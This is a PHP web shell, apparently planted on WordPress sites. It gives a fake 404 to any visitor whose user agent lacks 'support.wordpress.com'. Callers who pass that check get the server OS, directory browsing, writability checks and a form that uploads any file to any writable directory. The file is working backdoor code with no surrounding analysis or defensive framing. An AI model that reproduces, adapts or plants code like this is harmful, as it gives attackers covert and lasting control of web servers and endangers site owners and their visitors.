<?php
if ( @stripos ( $_SERVER['HTTP_USER_AGENT'], 'support.wordpress.com' ) == false ) { exit ("404-NOT-FOUND-ERROR"); }
echo "<html><head>
<style>
body{background-color:#111; color:#e1e1e1;}
a{color: #999; text-decoration:none;}
a:hover{text-decoration:underline;}
input,textarea,select{ color:#fff;background-color:#111;border:0; font: 10pt Monospace,'Courier New'; }
hr {border:1px solid white;}
</style>
<script>var d = document; function g(c) {
d.mf.c.value=c;
d.mf.submit();
}
</script>
</head><body>";
echo PHP_OS;
if(strtoupper(substr(PHP_OS, 0, 3) ) == "WIN")
	$os = 'win';
else
	$os = 'nix';
$home_cwd = @getcwd();
if(isset($_POST['c']))
	@chdir($_POST['c']);
$cwd = @getcwd();
if($os == 'win') {
	$home_cwd = str_replace("\\", "/", $home_cwd);
	$cwd = str_replace("\\", "/", $cwd);
	echo " Windows";
}
$safe_mode = @ini_get('safe_mode');
if(!$safe_mode) {
	echo " Safe mode:</span><font color=green><b> ON</b></font>\n";
}
if($cwd[strlen($cwd)-1] != '/')
	$cwd .= '/';
echo "Path: ".htmlspecialchars($cwd)."<input type=hidden name=c value='".htmlspecialchars($cwd) ."'><hr>";
if (!is_writable($cwd)) {
	echo "<font color=red>(Not writable)</font><br>";
}
if($_POST['p1'] === 'uploadFile') {
	if(!@move_uploaded_file($_FILES['f']['tmp_name'], $cwd.$_FILES['f']['name']))
echo "Can't upload!<br />";
}
$ls = wscandir($cwd);
echo "<form method=post name=mf style='display:none;'><input type=hidden name=c></form>";
foreach ($ls as $f) {
	if (is_dir($f))
{
echo "<a href=# onclick='g(\"".$cwd.$f."\");'>".$f."</a>";
if (is_writable($cwd.$f)) {
	echo "<font color=white>";
} else {
	echo "<font color=red>";
}
echo "<br />"; }
	else
{
	$files[] = $f; }
}
foreach ($files as $file) {
	echo $file."<br />";
}
echo	"<hr><form method='post' ENCTYPE='multipart/form-data'>
		<input type=hidden name=c value='" . $cwd ."'>
		<input type=hidden name=p1 value='uploadFile'>
		Upload file: <input type=file name=f><input type=submit value='>>'></form>";
function wscandir($cwdir) {
if(function_exists("scandir"))
{
return scandir($cwdir); }
	else
{
$cwdh  = opendir($cwdir);
while (false !== ($filename = readdir($cwdh)))
$files[] = $filename;
return $files; }
}
echo "</body></html>";